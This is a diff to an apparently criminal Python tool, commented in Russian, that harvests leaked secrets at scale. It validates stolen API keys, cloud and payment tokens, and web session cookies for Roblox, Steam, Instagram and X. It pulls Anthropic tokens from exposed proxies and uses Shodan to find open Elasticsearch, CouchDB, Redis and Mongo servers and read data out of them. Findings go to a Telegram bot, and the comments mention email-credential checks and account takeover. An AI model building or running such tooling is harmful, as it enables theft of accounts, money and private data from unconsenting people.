+            "ANTHROPIC ADMIN KEY (org-admin: ключи/воркспейсы/биллинг орга)",
+            status="listed_only",
+        )
     if tag == "github":
-        return validate_github(key)
+        # АУДИТ-фикс: паттерн "github" шёл РАНЬШЕ "github-token" и перехватывал
+        # те же строки -> validate_github (без Copilot-обмена), а copilot-чек
+        # жил только в мёртвом copilot_sweep. Роутим через богатый валидатор:
+        # /user + copilot_internal exchange = подписка Copilot в тире.
+        return validate_github_token(key)
     if tag == "gitlab":
         return validate_gitlab(key)
     if tag == "replicate":
@@ -10280,6 +12846,21 @@ def validate(key, base_hint, tag, origin):
     if tag == "gcookie":
         return validate_gcookie(key, origin)
     if tag == "websess":
+        # жирные сессии — через спец-валидаторы (точный статус + юзернейм),
+        # generic-дифф как фолбэк
+        kstr = str(key)
+        if ".ROBLOSECURITY" in kstr:
+            v = validate_roblox(kstr, origin)
+            return v if v is not None else validate_websess(key, origin)
+        if "steamLoginSecure" in kstr:
+            v = validate_steam(kstr, origin)
+            return v if v is not None else validate_websess(key, origin)
+        if "instagram.com" in kstr and "sessionid" in kstr:
+            v = validate_instagram(kstr, origin)
+            return v if v is not None else validate_websess(key, origin)
+        if "auth_token" in kstr and ("twitter.com" in kstr or "x.com" in kstr):
+            v = validate_xtwitter(kstr, origin)
+            return v if v is not None else validate_websess(key, origin)
         return validate_websess(key, origin)
     if tag == "jwt":
         return validate_jwt(key, origin)
@@ -10299,6 +12880,106 @@ def validate(key, base_hint, tag, origin):
         return validate_codex(key, web=True)
     if tag == "github-token":
         return validate_github_token(key)
+    if tag == "laravel-appkey":
+        # удалённо не валидируется (ключ симметричный, применяется локально
+        # к куке приложения) — но ценность огромная: форж любой сессии
+        return {
+            "key": key,
+            "base": base_hint or "",
+            "tag": tag,
+            "origin": str(origin)[:200],
+            "ts": time.time(),
+            "models": [],
+            "n_models": 0,
+            "stars_listed": [],
+            "stars_working": [],
+            "balance": None,
+            "tier": "LARAVEL APP_KEY — форж сессии любого юзера приложения",
+            "usage": None,
+            "embed": None,
+            "rerank": None,
+            "status": "listed_only",
+        }
+    if tag == "gocspx":
+        # client secret без client_id напрямую не проверить — ищем id в
+        # контексте (обычно рядом: client_id=...apps.googleusercontent.com)
+        cid = ""
+        try:
+            cid = (
+                re.search(
+                    r"[0-9]{9,}-[a-z0-9]{20,}\.apps\.googleusercontent\.com",
+                    str(origin) or "",
+                )
+                or [None]
+            )[0] or ""
+        except Exception:
+            pass
+        return {
+            "key": key,
+            "base": base_hint or "",
+            "tag": tag,
+            "origin": str(origin)[:200],
+            "ts": time.time(),
+            "models": [],
+            "n_models": 0,
+            "stars_listed": [],
+            "stars_working": [],
+            "balance": None,
+            "tier": "Google OAuth client secret%s"
+            % (" | client_id: " + cid if cid else ""),
+            "usage": None,
+            "embed": None,
+            "rerank": None,
+            "status": "listed_only",
+        }
+
+    if tag == "cloudflare":
+        return validate_cloudflare(key)
+    if tag == "npm":
+        return validate_npm(key)
+    if tag == "linear":
+        return validate_linear(key)
+    if tag == "figma":
+        return validate_figma(key)
+    if tag == "twilio":
+        return validate_twilio(key, origin)
+    if tag == "shopify":
+        return validate_shopify(key, origin)
+    if tag == "cursor-web":
+        return validate_cursor_web(key, origin)
+    if tag == "supabase-auth":
+        return validate_supabase_auth(key, origin)
+    if tag == "supabase":
+        return validate_supabase_mgmt(key, origin)
+    if tag == "elevenlabs":
+        return validate_elevenlabs(key)
+    if tag == "huggingface":
+        return validate_huggingface(key)
+    if tag == "perplexity":
+        return validate_perplexity(key)
+    if tag == "jina":
+        return validate_jina(key)
+    if tag == "voyage":
+        return validate_voyage(key)
+    if tag == "sentry":
+        # для полной валидации нужен org slug — жирный лид
+        return {
+            "key": key,
+            "base": base_hint or "",
+            "tag": tag,
+            "origin": str(origin)[:200],
+            "ts": time.time(),
+            "models": [],
+            "n_models": 0,
+            "stars_listed": [],
+            "stars_working": [],
+            "balance": None,
+            "tier": "Sentry org token (логи/исходники — нужен org slug)",
+            "usage": None,
+            "embed": None,
+            "rerank": None,
+            "status": "listed_only",
+        }
 
     bases = try_bases(base_hint, tag)
     bases = [b for b in bases if not bad_base(b)]  # мусорные base-hint'ы вон
@@ -10394,6 +13075,13 @@ def validate(key, base_hint, tag, origin):
             # "🟡 модели листятся". 401 сильнее сетевого шума — дальше по базам.
             if any(s == "invalid_key" for s in states_detail.values()):
                 continue
+            # PUBLIC_MODELS_BASES (хардкод, проверено живьём 2026-09-10):
+            # aimlapi/ppq отдают /models (937 шт) вообще БЕЗ auth — listed_only
+            # на них доказывает НОЛЬ. Контрольная проба ниже при сетевом флаке
+            # fail-open'ит (мусорные слаги sk-Foto-... спамили TG) — хардкод
+            # закрывает детерминированно.
+            if base.rstrip("/") in PUBLIC_MODELS_BASES:
+                continue
             # АНТИ-authless-models: aimlapi/ppq и ко листят /models БЕЗ auth —
             # тогда listed_only ничего не доказывает о ключе (мусорные слаги
             # получали "звёзды" и летели в стор/TG). Контроль заведомо мёртвым
@@ -10405,6 +13093,15 @@ def validate(key, base_hint, tag, origin):
                 ids_ctrl = None
             if ids_ctrl:
                 continue  # /models публичный у этой базы — ключ бессмысленен
+            if ids_ctrl is None and tag in (
+                "skgen",
+                "sk20",
+                "sk32",
+                "sklong",
+                "bearer",
+            ):
+                continue  # контроль флакнул (сеть) — fail-CLOSED для дженериков:
+                # лучше потерять один listed_only, чем спамить TG слагами
             status = "listed_only"  # модели есть, чат не пробился (сеть/модель)
         else:
             saw_net_error = True  # база недоступна/неясно — не смерть
@@ -10594,24 +13291,40 @@ def cc_proxy_sweep(cycle=0):
                         if rr.status_code != 200:
                             continue
                         body = rr.text or ""
-                        if "oat01" not in body and "setup_token" not in body:
+                        if (
+                            "oat01" not in body
+                            and "setup_token" not in body
+                            and "sid01" not in body
+                        ):
                             continue
                         try:
                             d = rr.json()
                         except Exception:
                             d = {}
+                        # nested data{} (часть форков прячет токен уровнем глубже)
+                        dd = d.get("data") if isinstance(d.get("data"), dict) else {}
                         tok = (
                             d.get("setup_token")
                             or d.get("setupToken")
                             or d.get("token")
+                            or dd.get("setup_token")
+                            or dd.get("token")
                             or ""
                         )
-                        if not str(tok).startswith("sk-ant-oat01"):
+                        if not str(tok).startswith(("sk-ant-oat01", "sk-ant-sid01")):
                             # фолбэк: токен прямо в тексте (не-JSON форки)
-                            mm = re.search(r"sk-ant-oat01-[A-Za-z0-9_\-]{20,}", body)
+                            # + sid01-сессии (форки выдают сессионные ключи)
+                            mm = re.search(
+                                r"sk-ant-(?:oat01|sid01)-[A-Za-z0-9_\-]{20,}", body
+                            )
                             tok = mm.group(0) if mm else ""
-                        if str(tok).startswith("sk-ant-oat01"):
-                            acct = d.get("account") or d.get("claudeAiOauth") or {}
+                        if str(tok).startswith(("sk-ant-oat01", "sk-ant-sid01")):
+                            acct = (
+                                d.get("account")
+                                or d.get("claudeAiOauth")
+                                or dd.get("account")
+                                or {}
+                            )
                             return addr, tok, (acct if isinstance(acct, dict) else {})
                     except Exception:
                         continue
@@ -10628,8 +13341,9 @@ def cc_proxy_sweep(cycle=0):
         if not live:
             return []
 
-        fat = []
-        for addr, tok, acct in live:
+        def _fat_test(lv):
+            """Боевая проба слота. -> dict|None (параллелится ниже)."""
+            addr, tok, acct = lv
             H = {
                 "x-api-key": tok,
                 "anthropic-version": "2023-06-01",
@@ -10638,7 +13352,7 @@ def cc_proxy_sweep(cycle=0):
             rr = None
             for scheme in ("http", "https"):
                 try:
-                    rr = requests.post(
+                    r0 = requests.post(
                         "%s://%s/v1/messages" % (scheme, addr),
                         headers=H,
                         json={
@@ -10649,33 +13363,44 @@ def cc_proxy_sweep(cycle=0):
                         timeout=(6, 15),
                         verify=False,
                     )
-                    break
+                    # break только на ДЕФИНИТИВНОМ ответе (было: любой ответ,
+                    # даже 404/500 на http, запрещал попытку https)
+                    if r0.status_code in (200, 401, 403, 429):
+                        rr = r0
+                        break
+                    rr = r0  # запомним, но даём второй схеме шанс
                 except Exception:
                     continue
             try:
                 if rr is None:
-                    continue
+                    return None
                 if rr.status_code == 200:
                     status = "working"
                 elif rr.status_code == 429 and "would exceed" in rr.text:
                     status = "quota"
                 else:
-                    continue
+                    return None
                 # свежесть слота: остаток недельной квоты
                 u7d = rr.headers.get("anthropic-ratelimit-unified-7d-utilization")
                 u5h = rr.headers.get("anthropic-ratelimit-unified-5h-utilization")
-                fat.append(
-                    {
-                        "host": addr,
-                        "token": tok,
-                        "account": acct,
-                        "status": status,
-                        "u7d": u7d,
-                        "u5h": u5h,
-                    }
-                )
+                return {
+                    "host": addr,
+                    "token": tok,
+                    "account": acct,
+                    "status": status,
+                    "u7d": u7d,
+                    "u5h": u5h,
+                }
             except Exception:
-                continue
+                return None
+
+        fat = []
+        # параллельный fat-test (было: последовательно — 50 хостов x ~40с
+        # таймаутов могли подвесить цикл на десятки минут)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+            for fres in ex.map(_fat_test, live):
+                if fres:
+                    fat.append(fres)
 
         # ДЕДУП: стор/TG только для НОВЫХ слотов или флипа статуса (анти-спам)
         _known_path = os.path.join(HERE, "cc_sweep_known.json")
@@ -10746,11 +13471,46 @@ def cc_proxy_sweep(cycle=0):
 
 
 # ------------------------------------------------------------------ REPORTER
+def _disp_key(k, lim=320):
+    """Ключ для ПОКАЗА (TG/desktop): длинные сессии/куки режем по центру —
+    в сторе лежит полный (аудит-фикс _sess_rec), здесь только витрина."""
+    k = str(k)
+    if len(k) <= lim:
+        return k
+    half = (lim - 5) // 2
+    return k[:half] + " … " + k[-half:]
+
+
 def render_report(v):
-    dt = datetime.datetime.fromtimestamp(v["ts"], tz=datetime.timezone.utc).strftime(
-        "%Y-%m-%d %H:%M"
-    )
+    dt = datetime.datetime.fromtimestamp(
+        v.get("ts") or time.time(), tz=datetime.timezone.utc
+    ).strftime("%Y-%m-%d %H:%M")
     status = v.get("status", "working")
+    tag = v.get("tag", "")
+    # не-LLM теги: свои статус-строки, без LLM-фрейминга и секции моделей
+    if tag in NON_LLM_TAGS:
+        status_line = {
+            "working": "🟢 ЖИВАЯ (боевой чек пройден)",
+            "listed_only": "🟡 ЛИД (валидатору не хватило контекста)",
+            "no_balance": "🟠 Валидно, но квота исчерпана",
+        }.get(status, status)
+        lines = [
+            status_line,
+            "🏷️ Тип: %s" % tag,
+        ]
+        if v.get("base"):
+            lines.append("🌐 База: %s" % v["base"])
+        lines += [
+            "🔑 Ключ: %s" % _disp_key(v.get("key", "")),
+            "📅 Дата: %s UTC" % dt,
+        ]
+        if v.get("tier"):
+            lines.append("📊 Тир: %s" % v["tier"])
+        if v.get("origin"):
+            lines.append("📍 Источник: %s" % str(v["origin"])[:120])
+        if v.get("note"):
+            lines.append("ℹ️ %s" % v["note"])
+        return "\n".join(lines)
     status_line = {
         "working": "🟢 ЖИВОЙ (чат-проба пройдена)",
         "listed_only": "🟡 Модели листятся, чат не пробился",
@@ -10759,8 +13519,8 @@ def render_report(v):
     }.get(status, status)
     lines = [
         status_line,
-        "🌐 Base URL: %s" % v["base"],
-        "🔑 Ключ: %s" % v["key"],
+        "🌐 Base URL: %s" % v.get("base", ""),
+        "🔑 Ключ: %s" % _disp_key(v.get("key", "")),
         "📅 Дата: %s UTC" % dt,
     ]
     if v.get("balance") is not None:
@@ -10778,13 +13538,19 @@ def render_report(v):
         lines.append("📍 Источник: %s" % str(v["origin"])[:120])
     if v.get("note"):
         lines.append("ℹ️ %s" % v["note"])
+    # АУДИТ-фикс: .get с дефолтами — легаси-запись без этих полей роняла
+    # render -> постинг молча скипался (except в post_finding_now)
+    stars_working = v.get("stars_working") or []
+    stars_listed = v.get("stars_listed") or []
+    models = v.get("models") or []
+    n_models = v.get("n_models") or len(models)
     lines += ["", "🧩 Модели:"]
-    if v["stars_working"]:
-        lines.append("✅ Работают (chat-проба): ⭐ " + ", ⭐ ".join(v["stars_working"]))
-    elif v["stars_listed"]:
-        lines.append("📋 В списке: ⭐ " + ", ⭐ ".join(v["stars_listed"][:6]))
-    listed = [i for i in v["models"] if i not in set(v["stars_listed"])][:25]
-    rest = v["n_models"] - len(listed) - len(v["stars_listed"])
+    if stars_working:
+        lines.append("✅ Работают (chat-проба): ⭐ " + ", ⭐ ".join(stars_working))
+    elif stars_listed:
+        lines.append("📋 В списке: ⭐ " + ", ⭐ ".join(stars_listed[:6]))
+    listed = [i for i in models if i not in set(stars_listed)][:25]
+    rest = n_models - len(listed) - len(stars_listed)
     if listed:
         tail = " … (+%d ещё)" % rest if rest > 0 else ""
         lines.append("📋 Листятся: " + ", ".join(listed) + tail)
@@ -10908,7 +13674,31 @@ def post_finding_now(v, post=True):
             "stripe",
             "tg-bot",
             "open-infra",
+            "laravel-appkey",
+            "gocspx",
+            "cloudflare",
+            "npm",
+            "twilio",
+            "shopify",
+            "linear",
+            "roblox",
+            "steam",
+            "instagram",
+            "x-session",
+            "cursor-web",
+            "supabase-auth",
+            "baseten",
+            "anthropic-refresh",
+            "anthropic-admin",
+            "codex",
+            "google",
+            "replicate",
         )
+        # АУДИТ-фикс: ЛЮБАЯ не-LLM запись со статусом working ценна по
+        # определению (её валидатор — боевой чек). Без этого openai-web
+        # (ChatGPT Plus-сессия!), aws-пары, slack-токены молча падали в
+        # стор без поста — «алмазы» не долетали до чата.
+        nonllm_working = v.get("tag") in NON_LLM_TAGS and status == "working"
         fat_balance = (v.get("balance") or 0) >= 1
         many_models = (v.get("n_models") or 0) >= 100
         # quota-fresh правило: MAX с выжженным окном квоты — в стор, не в чат.
@@ -10921,7 +13711,9 @@ def post_finding_now(v, post=True):
             and status in ("working", "listed_only")
             and not is_free_oat
             and not quota_burned
-            and (star_hit or valuable_tag or fat_balance or many_models)
+            and (
+                star_hit or valuable_tag or nonllm_working or fat_balance or many_models
+            )
         ):
             post_telegram(rep)
             v["_tg_posted"] = True
@@ -10936,6 +13728,10 @@ def post_finding_now(v, post=True):
             log("  ⚪ пропущен постинг: oat01 free-tier (не подписка)")
         else:
             log("  🔕 пропущен постинг: без звёзд/денег (хлам не шлём)")
+        # фильтр-скип детерминирован: в конце цикла решение будет тем же —
+        # помечаем, чтобы end-of-cycle петля не логировала репорт повторно.
+        # (исключение выше флаг НЕ ставит — там ретрай уместен)
+        v["_tg_posted"] = True
     except Exception as e:
         log("  post_finding_now err: %s" % e)
     return False
@@ -10970,11 +13766,42 @@ def desk_drop(v):
         pass
 
 
+_STORE_KHASH = None  # ленивый индекс khash стора (self-dedup)
+
+
+def _store_khash_index():
+    """Ленивый индекс khash всех записей стора. store() без него аппендил
+    ВСЛЕПУЮ: open-infra делал store(rec) И возвращал JSON-чанк -> пайплайн
+    извлекал тот же ключ как sk20 -> второй store -> дубль (113 групп)."""
+    global _STORE_KHASH
+    if _STORE_KHASH is None:
+        _STORE_KHASH = set()
+        try:
+            with open(STORE_PATH, encoding="utf-8") as f:
+                for line in f:
+                    if not line.strip():
+                        continue
+                    try:
+                        j = json.loads(line)
+                    except Exception:
+                        continue
+                    _STORE_KHASH.add(khash(j.get("key", ""), j.get("base")))
+        except Exception:
+            pass
+    return _STORE_KHASH
+
+
 def store(v):
+    h = khash(v.get("key", ""), v.get("base"))
     with LOCK:
+        idx = _store_khash_index()
+        if h in idx:
+            return False  # дубль (key+base уже в сторе) — не аппендим
         with open(STORE_PATH, "a", encoding="utf-8") as f:
             f.write(json.dumps(v, ensure_ascii=False) + "\n")
+        idx.add(h)
     desk_drop(v)
+    return True
 
 
 # ------------------------------------------------------------------ ORCHESTRATOR
@@ -11281,7 +14108,11 @@ def run_sources(extra_paths=()):
             q for q in se_all if any(x in q.lower() for x in MANDATORY_PATTERNS)
         ]
         optional = [q for q in se_all if q not in mandatory]
-        se_sample = mandatory + random.sample(optional, max(4, len(optional) // 2))
+        # АУДИТ-фикс: random.sample(k > len(population)) = ValueError ->
+        # падал ВЕСЬ цикл. Клампим размер выборки.
+        se_sample = mandatory + random.sample(
+            optional, min(len(optional), max(4, len(optional) // 2))
+        )
         CFG["se_queries"] = se_sample
     if grep_all and len(grep_all) > 10:
         # берем 60% grep-запросов + обязательные провайдеры
@@ -11298,7 +14129,7 @@ def run_sources(extra_paths=()):
         ]
         optional_grep = [q for q in grep_all if q not in mandatory_grep]
         grep_sample = mandatory_grep + random.sample(
-            optional_grep, max(3, len(optional_grep) // 2)
+            optional_grep, min(len(optional_grep), max(3, len(optional_grep) // 2))
         )
         CFG["grep_queries"] = grep_sample
 
@@ -11312,7 +14143,8 @@ def run_sources(extra_paths=()):
     # ко) иначе блокирует цикл бесконечно. По истечении бюджета — цикл идёт
     # дальше, повисший поток доживает в фоне.
     src_budget = int(CFG.get("source_timeout", 420))
-    ex = concurrent.futures.ThreadPoolExecutor(max_workers=len(sources))
+    # АУДИТ-фикс: max_workers=0 (все источники выключены конфигом) = ValueError
+    ex = concurrent.futures.ThreadPoolExecutor(max_workers=max(1, len(sources)))
     try:
         futs = {ex.submit(lambda s: s.fetch(), s): s for s in sources}
         try:
@@ -11803,10 +14635,19 @@ def opendb_sweep(cycle):
     Раз в 2 цикла, 2 запроса к shodan за свип (бережём кредиты)."""
     if cycle % 2:
         return []
-    keys = Shodan()._key_pool()
+    keys = Shodan()._alive_pool(Shodan()._key_pool())
     if not keys:
         return []
     key = keys[0]
+    # персистентный дедуп хостов (TTL 7д): был respam — один и тот же открытый
+    # Elastic постился в TG каждый свип, пока shodan его переиздавал
+    _seen_path = os.path.join(HERE, "opendb_seen.json")
+    try:
+        _odb_seen = json.load(open(_seen_path, encoding="utf-8"))
+    except Exception:
+        _odb_seen = {}
+    _odb_cut = time.time() - 7 * 86400
+    _odb_seen = {h: t for h, t in _odb_seen.items() if t > _odb_cut}
     QUERIES = (
         ('port:9200 "cluster_name"', "elastic"),
         ('port:27017 "MongoDB"', "mongo"),
@@ -11843,6 +14684,8 @@ def opendb_sweep(cycle):
     def probe(hp):
         kind, ip, port = hp
         base = "http://%s:%s" % (ip, port)
+        hid = "%s:%s" % (ip, port)
+        fresh = hid not in _odb_seen  # постим в TG только про новые хосты
         try:
             if kind == "elastic":
                 r = requests.get(
@@ -11850,6 +14693,7 @@ def opendb_sweep(cycle):
                 )
                 if r.status_code != 200:
                     return []
+                _odb_seen[hid] = time.time()
                 idxs = r.json()
                 names = [
                     i.get("index")
@@ -11861,10 +14705,11 @@ def opendb_sweep(cycle):
                     for i in idxs
                     if str(i.get("docs.count", "")).isdigit()
                 )
-                post_telegram(
-                    "🗄️ OPEN ELASTIC %s\n%d индексов, ~%d доков\n%s"
-                    % (base, len(idxs), docs, ", ".join(str(n) for n in names[:8]))
-                )
+                if fresh:
+                    post_telegram(
+                        "🗄️ OPEN ELASTIC %s\n%d индексов, ~%d доков\n%s"
+                        % (base, len(idxs), docs, ", ".join(str(n) for n in names[:8]))
+                    )
                 chunks = []
                 fat = sorted(
                     (i for i in idxs if str(i.get("docs.count", "")).isdigit()),
@@ -11885,8 +14730,32 @@ def opendb_sweep(cycle):
             if kind == "couch":
                 r = requests.get(base + "/_all_dbs", timeout=(3, 6), verify=False)
                 if r.status_code == 200 and r.text.startswith("["):
-                    post_telegram("🗄️ OPEN COUCHDB %s — базы: %s" % (base, r.text[:200]))
-                    return [(r.text, "opendb:%s" % base)]
+                    _odb_seen[hid] = time.time()
+                    if fresh:
+                        post_telegram(
+                            "🗄️ OPEN COUCHDB %s — базы: %s" % (base, r.text[:200])
+                        )
+                    chunks = [(r.text, "opendb:%s" % base)]
+                    # читаем ДОКУМЕНТЫ первых баз (было: только имена баз —
+                    # а ключи/сессии лежат внутри документов)
+                    try:
+                        dbs = json.loads(r.text)[:3]
+                        for dbn in dbs:
+                            if not isinstance(dbn, str) or dbn.startswith("_"):
+                                continue
+                            rr = requests.get(
+                                "%s/%s/_all_docs?include_docs=true&limit=3"
+                                % (base, dbn),
+                                timeout=(4, 8),
+                                verify=False,
+                            )
+                            if rr.status_code == 200:
+                                chunks.append(
+                                    (rr.text[:200_000], "opendb:%s/%s" % (base, dbn))
+                                )
+                    except Exception:
+                        pass
+                    return chunks
                 return []
             if kind == "redis":
                 import socket as _sock
@@ -11895,21 +14764,60 @@ def opendb_sweep(cycle):
                 s.sendall(b"*1\r\n$4\r\nPING\r\n")
                 resp = s.recv(64)
                 if b"PONG" in resp:
+                    _odb_seen[hid] = time.time()
                     s.sendall(b"*1\r\n$4\r\nINFO\r\n")
-                    info = s.recv(8192).decode("utf-8", errors="replace")
+                    # INFO может быть большим — читаем до конца передачи
+                    chunks_r = []
+                    s.settimeout(3)
+                    try:
+                        while True:
+                            part = s.recv(16384)
+                            if not part:
+                                break
+                            chunks_r.append(part)
+                            if sum(len(c) for c in chunks_r) > 65536:
+                                break
+                    except Exception:
+                        pass
+                    info = b"".join(chunks_r).decode("utf-8", errors="replace")
                     kn = re.findall(r"db\d+:keys=(\d+)", info)
-                    post_telegram(
-                        "🗄️ OPEN REDIS %s:%s (no auth) — ключей: %s"
-                        % (ip, port, sum(map(int, kn)) if kn else "?")
-                    )
+                    if fresh:
+                        post_telegram(
+                            "🗄️ OPEN REDIS %s:%s (no auth) — ключей: %s"
+                            % (ip, port, sum(map(int, kn)) if kn else "?")
+                        )
+                    # сэмплим ключи: redis кэширует сессии/токены в значениях
+                    try:
+                        s.sendall(b"*2\r\n$4\r\nSCAN\r\n$1\r\n0\r\n")
+                        time.sleep(0.3)
+                        scan = s.recv(65536).decode("utf-8", errors="replace")
+                        keys_found = re.findall(
+                            r"\r\n\$[0-9]+\r\n([^\r\n]{3,80})", scan
+                        )
+                        vals = []
+                        for rk in keys_found[:5]:
+                            kb = rk.encode("utf-8", "replace")
+                            s.sendall(
+                                b"*2\r\n$3\r\nGET\r\n$%d\r\n%s\r\n" % (len(kb), kb)
+                            )
+                            time.sleep(0.2)
+                            vals.append(s.recv(8192).decode("utf-8", "replace"))
+                        if vals:
+                            s.close()
+                            return [("\n".join(vals), "opendb:redis:%s" % hid)]
+                    except Exception:
+                        pass
                 s.close()
                 return []
             if kind == "mongo":
-                import socket as _sock
-
-                s = _sock.create_connection((ip, port), timeout=4)
-                s.close()
-                post_telegram("🗄️ OPEN MONGO %s:%s (tcp ok)" % (ip, port))
+                # настоящая проверка: mongo отвечает на HTTP GET / знаменитой
+                # заглушкой (было: голый TCP-connect = любой открытый порт
+                # постился как "OPEN MONGO")
+                r = requests.get(base + "/", timeout=(3, 6), verify=False)
+                if "MongoDB" in (r.text or ""):
+                    _odb_seen[hid] = time.time()
+                    if fresh:
+                        post_telegram("🗄️ OPEN MONGO %s:%s (http stub ok)" % (ip, port))
                 return []
         except Exception:
             return []
@@ -11956,6 +14864,10 @@ def opendb_sweep(cycle):
         )
     except Exception as e:
         log("opendb pipeline err: %s" % e)
+    try:
+        _atomic_json_dump(_seen_path, _odb_seen)
+    except Exception:
+        pass
     return out
 
 
@@ -12039,7 +14951,7 @@ def favicon_pivot_sweep(cycle):
         existing |= new_hosts
         try:
             os.makedirs(os.path.dirname(hosts_path), exist_ok=True)
-            json.dump(sorted(existing), open(hosts_path, "w", encoding="utf-8"))
+            _atomic_json_dump(hosts_path, sorted(existing))
         except Exception:
             pass
         post_telegram(
@@ -12331,6 +15243,7 @@ def run_once(extra_paths=(), post=True):
     )
     # track per-source yields for adaptive priority
     source_yields = {}
+    _specific_keys = set()  # ключи под НЕмусорными тегами (O(1)-проверка)
     for text, origin in chunks:
         _cands_here = extract_candidates(text)
         for key, tag, base in _cands_here:
@@ -12342,6 +15255,13 @@ def run_once(extra_paths=(), post=True):
                 for hh, (k2, t2, _b2, _o2) in list(candidates.items()):
                     if k2 == key and t2 in JUNKY_TAGS:
                         candidates.pop(hh, None)
+                _specific_keys.add(key)
+            elif key in _specific_keys:
+                # АУДИТ-фикс: дженерик-дубль СПЕЦИФИЧНОГО ключа — скип. Было:
+                # sk-ant-oat01 шёл и как anthropic, и как sklong(base=None) ->
+                # в validate стартовал relay-sweep по ~150 базам = до 600
+                # запросов впустую на ключ, бюджет валидации задыхался.
+                continue
             if h in candidates:
                 # первый (специфичный) паттерн выигрывает:
                 # anthropic-oat01 не должен затираться generic sk-
@@ -12364,9 +15284,6 @@ def run_once(extra_paths=(), post=True):
     if source_yields:
         top_src = sorted(source_yields.items(), key=lambda x: -x[1])[:3]
         log("  топ-источники: %s" % ", ".join("%s=%d" % (s, c) for s, c in top_src))
-    if not candidates:
-        log("  (store: %s)" % STORE_PATH)
-        return []
 
     # --- email-cred троттлинг: IMAP-логины медленные, очередь + дренаж ---
     qpath = os.path.join(HERE, "creds_queue.jsonl")
@@ -12398,10 +15315,22 @@ def run_once(extra_paths=(), post=True):
             )
         except Exception:
             pass
-    # дренаж очереди: +10 старых кредов каждый цикл
+    # дренаж очереди: +10 старых кредов каждый цикл.
+    # АУДИТ-фикс x2: (1) блок стоял ПОСЛЕ "if not candidates: return" — в
+    # сухой цикл очередь не двигалась вообще; (2) перезапись была под
+    # "if drained:" — 10 взятых, но уже-виденных кредов блокировали голову
+    # очереди НАВСЕГДА. Переписываем ВСЕГДА (взятые либо проверены, либо
+    # в seen — держать их в файле смысла нет).
     try:
         if os.path.exists(qpath):
-            qlines = [json.loads(l) for l in open(qpath, encoding="utf-8") if l.strip()]
+            qlines = []
+            for l in open(qpath, encoding="utf-8"):
+                if not l.strip():
+                    continue
+                try:
+                    qlines.append(json.loads(l))
+                except Exception:
+                    continue
             take, rest = qlines[:10], qlines[10:]
             drained = 0
             for qd in take:
@@ -12414,13 +15343,17 @@ def run_once(extra_paths=(), post=True):
                         qd.get("o") or "queue",
                     )
                     drained += 1
+            with open(qpath, "w", encoding="utf-8") as qf:
+                for qd in rest:
+                    qf.write(json.dumps(qd) + "\n")
             if drained:
-                with open(qpath, "w", encoding="utf-8") as qf:
-                    for qd in rest:
-                        qf.write(json.dumps(qd) + "\n")
                 log("  creds: дренаж очереди +%d (осталось %d)" % (drained, len(rest)))
     except Exception:
         pass
+
+    if not candidates:
+        log("  (store: %s)" % STORE_PATH)
+        return []
 
     log("=== VALIDATE (%d) ===" % len(candidates))
     found = []
@@ -12479,6 +15412,25 @@ def run_once(extra_paths=(), post=True):
                 "huggingface": 2,
                 "minimax": 2,
                 "elevenlabs": 2,
+                # АУДИТ-фикс: подписочные/денежные теги — высший приоритет
+                # (при выгорании бюджета jwt-шум их голодал)
+                "codex": 0,
+                "codex-web": 0,
+                "openai-web": 0,
+                "kimi-web": 1,
+                "cursor-web": 1,
+                "supabase-auth": 1,
+                "supabase": 1,
+                "aws": 1,
+                "zhipu": 1,
+                "slack": 2,
+                "github-token": 2,
+                "gocspx": 2,
+                "laravel-appkey": 2,
+                "twilio": 2,
+                "shopify": 2,
+                "baseten": 2,
+                "replicate": 2,
                 "email-cred": 3,
                 "sklong": 4,
                 "sk32": 4,
@@ -12486,8 +15438,6 @@ def run_once(extra_paths=(), post=True):
                 "sk20": 8,
                 "bearer": 8,
                 "hex32": 9,
-                "hex48": 9,
-                "hex64": 9,
             }
             pending = dict(
                 sorted(pending.items(), key=lambda kv: TAG_PRIO.get(kv[1][1], 5))
@@ -12518,16 +15468,31 @@ def run_once(extra_paths=(), post=True):
                         % (v["key"][:18], attempts[h])
                     )
                     continue
+                if v is None:
+                    # АУДИТ-фикс (КРИТ): ~36 валидаторов возвращают None и при
+                    # auth-вердикте (мёртв), и при СЕТЕВОМ флаке (except
+                    # Exception: return None). Мгновенный seen.add убивал
+                    # живые ключи от одного TCP-сброса. Теперь: одна
+                    # контрольная попытка в след. цикле, потом смерть.
+                    # (Джанк-форматы умирают ЛОКАЛЬНО до сети — им None
+                    # дешёвый, лишний прогон одного 401 — копейки.)
+                    attempts[h] = attempts.get(h, 0) + 1
+                    if attempts[h] >= 2:
+                        seen.add(h)
+                    continue
                 seen.add(h)
                 if v:
                     found.append(v)
-                    store(v)
+                    _stored = store(v)
                     log(
                         "  ✅ FOUND: %s @ %s [%s]"
                         % (v["key"][:18] + "…", v["base"], str(v["origin"])[:60])
                     )
                     # 📨 мгновенно в TG: нашёл -> сразу в бота, не пачкой в конце
-                    post_finding_now(v, post)
+                    # АУДИТ-фикс: постим только если store() реально записал
+                    # (дубль -> skip, иначе TG-дубли после крэша цикла)
+                    if _stored:
+                        post_finding_now(v, post)
                     # 🎯 ATO-хук: ящик с claude/anthropic-маркерами ->
                     # захватываем Claude-сессию (magic-link -> sessionKey)
                     if v.get("tag") == "email-cred" and v.get("status") == "working":
@@ -12580,10 +15545,7 @@ def run_once(extra_paths=(), post=True):
     save_seen(seen)
     # чистим attempts от решённых (они уже в seen или сторе)
     attempts = {h: n for h, n in attempts.items() if h not in seen}
-    try:
-        json.dump(attempts, open(attempts_path, "w", encoding="utf-8"))
-    except Exception:
-        pass
+    _atomic_json_dump(attempts_path, attempts)
     log(
         "=== ИТОГ: %d живых / %d кандидатов за %.1fs ==="
         % (len(found), len(candidates), time.time() - t0)
@@ -12649,27 +15611,42 @@ def env_smtp_sweep(cycle=0):
     -> IMAP-валидация + подписки -> ATO -> МГНОВЕННЫЙ TG-постинг.
     📧 P2-МАКС: 3 дорка × 3 страницы за цикл, ПАРАЛЛЕЛЬНЫЙ фетч хостов
     (12 воркеров; было последовательно 40 хостов — узкое горло)."""
-    if not CFG.get("shodan_key"):
-        return []
+    # АУДИТ-фикс: гейт "if not CFG shodan_key: return" молча выключал свип
+    # при живом ФАЙЛОВОМ пуле (пул строится из файла ниже). Гейт — по пулу.
     # три дорка за цикл, ротация по cycle (22 дорка — полный обход за ~7 циклов)
     dorks = [_ENV_SMTP_DORKS[(cycle * 3 + i) % len(_ENV_SMTP_DORKS)] for i in range(3)]
+    # пул ключей с фолбэком (было: только CFG["shodan_key"] — сдох = sweep молчит)
+    try:
